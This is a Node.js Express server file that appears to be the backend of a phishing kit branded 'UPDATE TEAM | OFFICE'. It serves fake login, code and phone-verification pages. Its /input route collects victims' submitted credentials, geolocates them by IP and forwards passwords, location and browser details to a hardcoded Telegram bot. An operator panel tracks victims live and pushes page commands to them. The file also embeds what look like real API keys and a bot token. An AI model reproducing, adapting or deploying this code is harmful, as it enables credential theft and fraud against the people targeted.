const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const { sendMessageFor } = require('simple-telegram-message');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs').promises;
const session = require('express-session');

const app = express();
const port = process.env.PORT || 3000;

// Constants for API details
const API_URL = 'https://api-bdc.net/data/ip-geolocation?ip=';
const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const botToken = "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4";
const chatId = "5200289419";

app.use(session({
    secret: "3f73f14e9b29c8f5a6c1d3ee67d2a8a42a99e02e3f5b678d3d6a81f96b4873a2",
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false } // Set to true if using HTTPS
}));

app.use(express.static('public'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Initialize SQLite database
const db = new sqlite3.Database(':memory:');

// Insert default admin credentials
const defaultUsername = 'admin';
const defaultPassword = 'updateteam'; // Remember to hash passwords for security
const hashedPassword = crypto.createHash('sha256').update(defaultPassword).digest('hex');

db.serialize(() => {
    db.run("CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, inputs TEXT, ip TEXT, command TEXT)");
    db.run("CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, stats TEXT)");
    db.run("CREATE TABLE IF NOT EXISTS admin (username TEXT PRIMARY KEY, password TEXT)");

    db.get("SELECT * FROM admin WHERE username = ?", [defaultUsername], (err, row) => {
        if (err) {
            console.error(`Error checking admin: ${err.message}`);
            return;
        }
        if (!row) {
            // Insert default admin credentials if they don't already exist
            db.run("INSERT INTO admin (username, password) VALUES (?, ?)", [defaultUsername, hashedPassword], (err) => {
                if (err) {
                    console.error(`Error inserting default admin credentials: ${err.message}`);
                } else {
                    console.log('Default admin credentials inserted successfully');
                }
            });
        } else {
            console.log('Default admin credentials already exist');
        }
    });
});

let visitors = 0;
let humans = 0;
let bots = 0;
let stats = '';
let clients = {};
let adminClient = null;
let currPage = "";
let message = '';
let defaultCommand = "not";
let clientData = {};

function resetVisits() {
    visitors = 0;
}

function addClientToDatabase(clientId, ip, command) {
    // Query to check if the client already exists
    db.get("SELECT id FROM clients WHERE id = ?", [clientId], (err, row) => {
        if (err) {
            console.error(`Error checking client ${clientId}: ${err.message}`);
            return;
        }

        if (row) {
            // Client already exists
            console.log(`Client ${clientId} already exists in the database`);
        } else {
            // Client does not exist, proceed to add the client
            visitors++;
            humans++;
            db.run("INSERT INTO clients (id, inputs, ip, command) VALUES (?, ?, ?, ?)", 
                   [clientId, JSON.stringify({}), ip, command], (err) => {
                if (err) {
                    console.error(`Error adding client ${clientId}: ${err.message}`);
                } else {
                    console.log(`Client ${clientId} with IP ${ip} added to the database`);
                }
            });
        }
    });
}

function updateClientCommand(clientId, command, callback) {
    db.get("SELECT * FROM clients WHERE id = ?", [clientId], (err, row) => {
        if (err) {
            console.error(`Error checking client ${clientId}: ${err.message}`);
            return callback(err, false);
        } else if (!row) {
            // No row found
            return callback(null, false);
        } else {
            db.run("UPDATE clients SET command = ? WHERE id = ?", [command, clientId], (err) => {
                if (err) {
                    console.error(`Error updating command for client ${clientId}: ${err.message}`);
                    return callback(err, false);
                } else {
                    console.log(`Command updated for client ${clientId}`);
                    return callback(null, true, row); // Pass the existing row back
                }
            });
        }
    });
}

function updateClientInputs(clientId, inputs) {
    return new Promise((resolve, reject) => {
        db.run("UPDATE clients SET inputs = ? WHERE id = ?", [JSON.stringify(inputs), clientId], (err) => {
            if (err) {
                reject(`Error updating inputs for client ${clientId}: ${err.message}`);
            } else {
                resolve(`Inputs updated for client ${clientId}`);
            }
        });
    });
}

function addInputClientToDatabase(clientId, ip, command, callback) {
    db.run("INSERT OR IGNORE INTO clients (id, inputs, ip, command) VALUES (?, ?, ?, ?)", [clientId, JSON.stringify({}), ip, command], (err) => {
        if (err) {
            console.error(`Error adding client ${clientId}: ${err.message}`);
            callback(err);
        } else {
            console.log(`Client ${clientId} with IP ${ip} added to the database`);
            callback(null);
        }
    });
}


// Function to get client data from the database
const clientCache = {};

function getClientFromDatabase(clientId, callback) {
    if (clientCache[clientId]) {
        console.log('Fetching client data from cache');
        callback(null, clientCache[clientId]);
    } else {
        db.get("SELECT * FROM clients WHERE id = ?", [clientId], (err, row) => {
            if (err) {
                console.error(`Error fetching client ${clientId}: ${err.message}`);
                callback(err, null);
            } else {
                if (row) {
                    clientCache[clientId] = row;
                }
                callback(null, row);
            }
        });
    }
}



function addStatsToDatabase(stats) {
    db.run("INSERT INTO stats (stats_json) VALUES (?)", [stats], (err) => {
        if (err) {
            console.error(`Error adding stats: ${err.message}`);
        } else {
            console.log(`Stats added to the stats table`);
        }
    });
}

function removeClientFromDatabase(clientId) {
    db.run("DELETE FROM clients WHERE id = ?", [clientId], (err) => {
        if (err) {
            console.error(`Error removing client ${clientId}: ${err.message}`);
        } else {
            console.log(`Client ${clientId} removed from the database`);
        }
    });
}

function logAllDataFromTable(tableName) {
    const query = `SELECT * FROM ${tableName}`;

    db.all(query, [], (err, rows) => {
        if (err) {
            console.error(`Error fetching data from ${tableName}:`, err.message);
        } else {
            rows.forEach((row) => {
                console.log("Clients All Data" + row);
            });
        }
    });
}

	function getClientData(callback) {
	    db.all("SELECT * FROM clients", (err, rows) => {
	        if (err) {
	            console.error(`Error retrieving client data: ${err.message}`);
	            callback([]);
	        } else {
	            callback(rows.map(row => ({ clientId: row.id, inputs: JSON.parse(row.inputs), ip: row.ip, command: row.command })));
	        }
	    });
	}
	
	function broadcastAdminPanel(currPage, stats) {
		
	    getClientData((clientList) => {
	        stats = { visitors, humans, bots };
	        currPage = { currPage };
	        console.log(stats);
	        const message = JSON.stringify({ type: 'adminUpdate', clientList, currPage, stats });
	        console.log(`Broadcasting to admin panel: ${message}`);
	        if (adminClient) {
	            adminClient.write(`data: ${message}\n\n`);
	        } else {
	        	
	            console.log('No admin client connected');
	        }
	    });
	}
	
function getClientIp(req) {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) {
        const ips = xForwardedFor.split(',');
        return ips[0].trim();
    }
    return req.connection.remoteAddress || req.socket.remoteAddress || null;
}



app.get('/forgot', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'reset.html'));
});

app.post('/forgot', (req, res) => {
    const { apiKey, username, newPassword } = req.body;
    const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');

    db.get("SELECT * FROM api_keys WHERE key = ?", [apiKey], (err, row) => {
        if (err) {
            console.error(`Error retrieving API key: ${err.message}`);
            return res.status(500).send('Error verifying API key');
        }
        if (row) {
            db.get("SELECT * FROM admin WHERE username = ?", [username], (err, row) => {
                if (err) {
                    console.error(`Error retrieving admin: ${err.message}`);
                    return res.status(500).send('Error retrieving admin');
                }
                if (row) {
                    db.run("UPDATE admin SET password = ? WHERE username = ?", [hashedNewPassword, username], (err) => {
                        if (err) {
                            console.error(`Error updating password: ${err.message}`);
                            return res.status(500).send('Error updating password');
                        }
                        res.send('Password reset successfully');
                    });
                } else {
                    res.status(404).send('User not found');
                }
            });
        } else {
            res.status(401).send('Unauthorized: Invalid API key');
        }
    });
});

app.post('/delete-client', (req, res) => {
    const { clientId } = req.body;
    if (clientId) {
        // Remove the client from memory and database
        if (clients[clientId]) {
            clients[clientId].end(); // End the SSE connection
            delete clients[clientId];
        }
        removeClientFromDatabase(clientId);
        broadcastAdminPanel(currPage, stats);
        res.sendStatus(200);
    } else {
        res.status(400).send('Missing clientId');
    }
});

app.post('/client-data', (req, res) => {
    const clientId = req.body.clientId;

    if (!clientId) {
        return res.status(400).send('Missing clientId');
    }

    getClientFromDatabase(clientId, (err, clientData) => {
        if (err) {
            console.error(`Error fetching client data for ${clientId}: ${err.message}`);
            return res.status(500).send('Internal Server Error');
        }
        if (!clientData) {
            return res.status(404).send('Client not found');
        }
        res.json(clientData);
    });
});

app.post('/send-command', (req, res) => {
    const { clientId, command } = req.body;
    const client = clients[clientId];
    if (client) {
        client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
        console.log("command: "+command+" set for " + client);
    }
    res.sendStatus(200);
});

const HEARTBEAT_INTERVAL = 60000; // 1 minute

app.post('/heartbeat', (req, res) => {
    const clientId = req.body.clientId;
    currPage = req.body.currPage;
	console.log("heartbeat broadcasting");
    if (clients[clientId]) {
        // Reset the heartbeat timeout
        clearTimeout(clients[clientId].timeout);
        clients[clientId].timeout = setTimeout(() => {
            console.log(`No heartbeat received from client ${clientId}. Performing action.`);
            // Perform the desired action here
        }, HEARTBEAT_INTERVAL);
        res.send('true');
        
    } else {
        currPage = "Disconnected";
    }
    broadcastAdminPanel(currPage, stats);
    logAllDataFromTable(clientId);
});

app.get('/events', (req, res) => {
    const isAdmin = req.query.admin === 'true';
    const clientIp = getClientIp(req);

    console.log(`Received /events request: isAdmin=${isAdmin}, ip=${clientIp}`);

    if (isAdmin) {
        adminClient = res;
        console.log('admin connected');
        
        // Set headers for Server-Sent Events (SSE)
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');

        // Send initial data to admin client
        res.write(`data: ${JSON.stringify({ type: 'initial', clients: Object.keys(clients) })}\n\n`);
        broadcastAdminPanel(currPage, stats);
        
        // Handle connection close
        req.on('close', () => {
            adminClient = null;
            console.log('Admin client disconnected');
        });
    }
});


app.post('/input', async (req, res) => {
	
	const ipAddress = getClientIp(req);
	const sendAPIRequest = async (ipAddress) => {
    const apiResponse = await axios.get(API_URL + ipAddress + '&localityLanguage=en&key=' + API_KEY);
    console.log(apiResponse.data);
    return apiResponse.data;
  };
    try {
        const { clientId, currPage, inputs } = req.body;
        console.log('Received /input request:', req.body);

        if (!clientId || typeof inputs !== 'object') {
            return res.status(400).send('Missing clientId or inputs object');
        }

        
        const ipAddressInformation = await sendAPIRequest(ipAddress);
        let command = "not"; 

        updateClientCommand(clientId, command, async (err, rowUpdated, row) => {
            if (err) {
                console.error("Error updating client command:", err);
                return res.status(500).send('Error updating client command');
            } else {
                console.log("Client command updated successfully.");
                // Client command updated successfully
                const existingInputs = row ? JSON.parse(row.inputs) : {};
                const updatedInputs = { ...existingInputs, ...inputs };

                await updateClientInputs(clientId, updatedInputs);
                broadcastAdminPanel(currPage, { visitors, humans, bots });

                if (!ipAddressInformation) {
                    return res.status(500).send('Error retrieving IP information');
                }

                const userAgent = req.headers["user-agent"];
                const systemLang = req.headers["accept-language"];

                if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
                    let message = `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
                        `👤 LOGIN \n\n`;

                    const inputKeys = Object.keys(inputs);

                    inputKeys.forEach(key => {
                        if (key === 'password') {
                            message += `🌍 GEO-IP INFO\n` +
                                `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
                                `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
                                `CITY             : ${ipAddressInformation.location.city}\n` +
                                `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
                                `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
                                `COUNTRY          : ${ipAddressInformation.country.name}\n` +
                                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
                                `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
                                `💻 SYSTEM INFO\n` +
                                `USER AGENT       : ${userAgent}\n` +
                                `SYSTEM LANGUAGE  : ${systemLang}\n` +
                                `💬 Telegram: https://t.me/UpdateTeams\n`;
                            return;
                        }
                        const value = inputs[key];
                        console.log(`${key}: ${value}\n`);
                        message += `${key}: ${value}\n`;
                    });

                    const sendMessage = sendMessageFor(botToken, chatId);
                    sendMessage(message);
                    console.log(`Message: ${message}`);
                } else {
                    console.log('Inputs are empty or not defined.');
                }

                return res.sendStatus(200);
            }
        });
    } catch (error) {
        console.error(`Error processing request: ${error.message}`);
        res.sendStatus(500);
    } 
});

app.post('/update-inputs', (req, res) => {
    const { clientId, inputs } = req.body;

    if (clients[clientId]) {
        // Update client inputs in the database
        updateClientInputs(clientId, inputs);
        broadcastAdminPanel(currPage, stats);
        res.sendStatus(200);
    } else {
        res.status(404).send('Client not found');
    }
});

app.post('/confirm-api', (req, res) => {
    const { apiKey } = req.body;
    if (apiKeys.has(apiKey)) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid API key' });
    }
});

app.post('/verify', async (req, res) => {
    const { email } = req.body;
    const apiKey = '59637b640cb0fcbdd080e2b52d6dbc0b9191a2a0e974c746ad9331d23450'; // Replace with your actual API key
    const url = `https://api.quickemailverification.com/v1/verify?email=${email}&apikey=${apiKey}`;

    try {
        // Make request to QuickEmailVerification API
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error('Failed to verify email');
        }

        const data = await response.json();

        // Check the result and disposable status from the API response
        if (data.result === 'valid' && data.disposable === 'false') {
        	console.log(email +" : "+ data);
            res.json({ success: true }); // Email is valid
        } else {
            res.json({ success: false }); // Email is invalid or disposable
        }
    } catch (error) {
        console.error('Error verifying email:', error);
        res.status(500).json({ success: false, error: 'Failed to verify email' });
    }
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/code', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'entercode.html'));
});

app.get('/phone', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verifyphone.html'));
});

app.get('/load', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'loading.html'));
});

// Route to handle the login form submission
app.post('/admin', (req, res) => {
    const { username, password } = req.body;
    console.log('Received login request:', req.body);

    if (!username || !password) {
        return res.status(400).send('Username and password are required');
    }

    const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
    console.log('Hashed password:', hashedPassword);

    db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedPassword], (err, row) => {
        if (err) {
            console.error(`Error retrieving admin: ${err.message}`);
            return res.status(500).send('Error retrieving admin');
        }
        if (row) {
            console.log(row);
            // Set the session variable
            req.session.loggedIn = true;
            // Redirect to the admin dashboard
            res.redirect('/admin/dashboard');
        } else {
            res.status(401).send('Unauthorized: Invalid username or password');
        }
    });
});

// Middleware to check if user is logged in
function checkAuth(req, res, next) {
    if (req.session.loggedIn) {
        return next();
    } else {
        res.status(401).send('Unauthorized: You need to log in first');
    }
}

app.get('/admin/dashboard', checkAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});

// Route to change the admin password
app.post('/change-password', (req, res) => {
    const { username, oldPassword, newPassword } = req.body;
    const hashedOldPassword = crypto.createHash('sha256').update(oldPassword).digest('hex');
    const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');

    db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedOldPassword], (err, row) => {
        if (err) {
            console.error(`Error retrieving admin: ${err.message}`);
            return res.status(500).send('Error retrieving admin');
        }
        if (row) {
            db.run("UPDATE admin SET password = ? WHERE username = ?", [hashedNewPassword, username], (err) => {
                if (err) {
                    console.error(`Error updating password: ${err.message}`);
                    return res.status(500).send('Error updating password');
                }
                res.send('Password changed successfully');
            });
        } else {
            res.status(401).send('Unauthorized: Invalid username or old password');
        }
    });
});

const apiKeys = new Set(['your_api_key']);


// Endpoint to confirm API key
app.post('/confirm-api', (req, res) => {
    const { apiKey } = req.body;
    if (apiKeys.has(apiKey)) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid API key' });
    }
});


app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});

process.on('SIGINT', () => {
    db.close((err) => {
        if (err) {
            console.error(`Error closing database: ${err.message}`);
        } else {
            console.log('Database connection closed');
        }
        process.exit();
    });
});